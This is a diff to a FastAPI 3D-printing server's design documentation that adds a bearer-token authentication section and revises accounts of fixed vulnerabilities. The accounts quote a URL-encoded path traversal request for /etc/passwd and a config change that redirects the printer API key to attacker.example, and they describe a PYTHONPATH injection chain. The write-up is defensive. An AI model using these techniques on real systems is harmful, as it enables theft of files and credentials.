@@ -915,6 +915,75 @@ the same STL byte for byte (`tests/test_deck_box.py`, `tests/test_card_divider.p
 ### Server (server/app.py)
 
 FastAPI application with:
+- **Authentication: one shared secret on every route but `GET /health` and the SPA**
+  (`server/auth.py`). There was none at all, and the routes that answered anything
+  reaching the port included the ones that spend money (`POST /jobs`, EUR 0,32 a
+  hosted generation), move hardware (`POST /jobs/{id}/print-dispatch`) and stand in
+  for a person (`POST /jobs/{id}/blueprint-approval`, the Tier 3 IP gate). A loopback
+  bind shrank the exposure to every process on the machine; it never made the server
+  safe to publish.
+
+  `DS_API_TOKEN`, or `~/.ds-mvp/.api_token` — generated `0600` on first start, beside
+  the config store's Fernet key and therefore inside the `~/.ds-mvp` mount both
+  containers already have, so a native run and a compose run resolve the same secret
+  without anyone copying it (`pythonsrc/api_token.py`). Only the server may generate
+  one: a caller that invented its own would authenticate against a server that had
+  never seen it, and would report a missing token as a wrong one.
+
+  Five decisions worth keeping:
+
+  - **A header, not a cookie.** A cookie rides along on a cross-site request whether
+    the person meant it or not, and several routes take no body at all
+    (`POST /jobs/{id}/outcome/prompt-shown`, `DELETE /jobs/{id}`) — so a `<form>` on
+    any page in the browser would have authenticated as the operator. A bearer header
+    cannot be sent cross-origin without a preflight, and the preflight fails because
+    there is deliberately no CORS middleware. `hmac.compare_digest`; the 401 carries
+    `WWW-Authenticate: Bearer`.
+  - **Exempt by marker, not by list.** `@public` on the endpoint is what exempts it,
+    and the middleware reads that off the route it matched — a walk to the first
+    `Match.FULL`, and only for a GET, so nothing that writes is ever exempt. A list of
+    paths would go stale the moment someone added a route, and it would go stale in
+    the direction that leaves a route open. Two endpoints wear it: `GET /health`,
+    polled by things that hold no credential, and the SPA catch-all, which serves the
+    bundle a person needs *in order to* type the token — safe only because
+    `contained_path` is what decides which files it will serve.
+    `tests/test_api_auth.py` asserts the marked set and builds its 401 matrix from the
+    router, so a new route is covered on the day it is added.
+  - **Inside the request log, not outside it.** Starlette builds the stack
+    inner-first, so the middleware is installed *before* `log_requests` and runs
+    inside it. A 401 is exactly the line an operator needs in the log and the activity
+    feed; rejecting outside the logger would make an attack the one thing that leaves
+    no trace.
+  - **The WebSocket takes `?token=`, refused before `accept()`.** A browser cannot put
+    a header on `new WebSocket(...)`. The alternative — accept, then ask in the first
+    message — leaves unauthenticated sockets open until something times them out and
+    puts the check in every handler. The denial is a real HTTP 401 through ASGI's
+    `websocket.http.response` extension, with a close (1008) where the server does not
+    offer it. The token in a URL is survivable here only because uvicorn's access log
+    is off and `log_requests` records the path alone; a test pins that nothing logs
+    the query.
+  - **Not a config-store key, deliberately.** `PUT /config` must not be able to rotate
+    the credential that protects `PUT /config` — one bad write would lock every client
+    out with no way back in through the API.
+
+  The SPA keeps the token in `localStorage` and shows a paste-once gate without one
+  (`web/src/api/auth.ts`, `components/TokenGate.tsx`); `api/http.ts` is the only place
+  that attaches it, with three wrappers because a browser attaches credentials to none
+  of these by itself — `apiFetch`, `withToken` for the upgrade, and
+  `authedObjectUrl`/`downloadAuthed` for the `<img src>` and download anchors the
+  browser requests itself. Injecting the token into `index.html` for a loopback caller
+  was refused: it hands the secret to every process on the machine through the one
+  route that is exempt *because* it is safe to be public, and it cannot work for a
+  hosted client, which is never loopback.
+
+  The pipeline container and the dispatch operator are handed it by `subprocess_env`
+  — `docker compose run -e DS_API_TOKEN` **by name**, so it never reaches an argv that
+  `ps` can read — because their collectors relay through
+  `POST /jobs/{id}/internal-telemetry`, which anyone could previously have used to
+  inject invented samples into a live job and into the dataset.
+
+  What this is not: there is no per-user model (magic-link accounts are Phase 5), no
+  CORS, no TLS and no `TrustedHostMiddleware`. Revocation is rotation for everybody.
 - **REST API**: CRUD for jobs (`/jobs`), config management (`/config`), printer simulators (`/simulators/*`), health check, and `GET /jobs/{job_id}/printability` (full report, falling back to the per-job `printability.json` artifact for older jobs). `GET /jobs/{job_id}` also carries `printability_score` / `printability_verdict`.
 - **Capture and feedback endpoints**: `GET /jobs/{id}/provenance` returns the whole capture record
   (blueprint, mesh, slice, target, engagement, outcome) — kept off `GET /jobs/{id}`, which the UI
@@ -1031,10 +1100,11 @@ FastAPI application with:
   target straight into `scope["path"]`, and Starlette's `{...:path}` converter matches
   `/` and `..` alike — so `GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd` reached `serve_spa` as
   `../../../etc/passwd`, `os.path.join` walked out of `web/dist`, and `FileResponse`
-  streamed the file. There is **no end-user authentication in this server**, and the
-  api-server process is the one with `~/.ds-mvp/.config_key` bind-mounted, so that was
-  an unauthenticated read of the Fernet key for the store holding printer API keys —
-  and of `.env` and `pythonsrc/config.py` beside it. `contained_path(base, *parts)`
+  streamed the file. The api-server process is the one with `~/.ds-mvp/.config_key`
+  bind-mounted, so that was a read of the Fernet key for the store holding printer API
+  keys — and of `.env` and `pythonsrc/config.py` beside it, and an *unauthenticated*
+  read even now, because `serve_spa` is one of the two routes that is still `@public`
+  and has to be. `contained_path(base, *parts)`
   joins and then requires `is_relative_to(base)` **after `resolve()`**: a lexical check
   passes a path whose every component is innocent and whose symlink target is not, and
   an *absolute* part needs no `..` at all (`Path("web/dist") / "/etc/passwd"` is
@@ -1078,12 +1148,14 @@ FastAPI application with:
   support, and the same arbitrary read reachable through
   `GET /system/printer/status`; that fallback is gone. `PrinterSetup`'s datalist was
   already entirely `pythonsrc/profiles/*.json`.
-  **The bigger hole beside it** — `POST /config` has no authentication, so a caller
+  **The bigger hole beside it** — `POST /config` had no authentication, so any caller
   could repoint `OCTOPRINT_URL` at their own host and have the server ship it
-  `OCTOPRINT_API_KEY` — is closed by the host binding below.
+  `OCTOPRINT_API_KEY` — is closed by the host binding below. The shared secret closes
+  it a second time, and the binding is still the load-bearing half: it holds against
+  anyone who *does* hold the token, which one shared credential makes a real case.
 - **Config store** (`config_store.py`): Fernet-encrypted key-value store in the telemetry database (`app_config` table); the key stays on the host at `$DS_CONFIG_KEY_PATH`, default `~/.ds-mvp/.config_key`
-- **A printer credential is bound to the host it was saved for.** `POST /config` has
-  no authentication and it writes *both halves* of an authenticated outbound request:
+- **A printer credential is bound to the host it was saved for.** `POST /config` had
+  no authentication, and it writes *both halves* of an authenticated outbound request:
   the address and the key. So one request repointing `OCTOPRINT_URL` at
   `http://attacker.example/`, followed by `POST /config/test-connection`, made this
   server send `GET http://attacker.example/api/version` carrying the real
@@ -1138,7 +1210,7 @@ FastAPI application with:
   hook copied the whole store into `os.environ` besides, and both launches —
   `docker compose run pipeline-runner` and `run_operator.py` — were
   `os.environ.copy()`. So every stored key was a variable in every child process this
-  server spawns, set by an endpoint with **no authentication** in front of it.
+  server spawns, set by an endpoint that had **no authentication** in front of it.
   `PYTHONPATH` was one of those keys: one request prepended an import path to the
   pipeline container, whose `data/inputs`, `data/outputs` and `data/logs` are writable
   bind mounts — one file write away from code execution, so a chain rather than a
